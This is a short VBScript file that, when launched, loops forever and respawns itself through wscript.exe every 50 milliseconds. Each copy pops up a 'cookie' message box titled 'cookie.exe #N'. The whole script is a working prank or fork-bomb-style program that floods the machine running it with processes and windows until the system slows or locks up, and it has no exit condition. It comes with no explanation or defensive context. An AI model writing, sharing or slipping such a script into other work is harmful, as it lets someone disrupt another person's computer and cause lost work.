
Const WaitTime = 50 


Set Shell = CreateObject("WScript.Shell")
Dim ScriptPath
Dim CurrentCount 


ScriptPath = WScript.ScriptFullName


If WScript.Arguments.Count = 0 Then
    
 
    
    CurrentCount = 1
    

    Do
        

        Shell.Run "wscript.exe /nologo """ & ScriptPath & """ " & CurrentCount, 1, False
        

        CurrentCount = CurrentCount + 1
        

        WScript.Sleep WaitTime
        
    Loop
    
Else
    

    

    MsgBox "cookie", 64, "cookie.exe #" & WScript.Arguments(0)

 
    WScript.Quit
    
End If
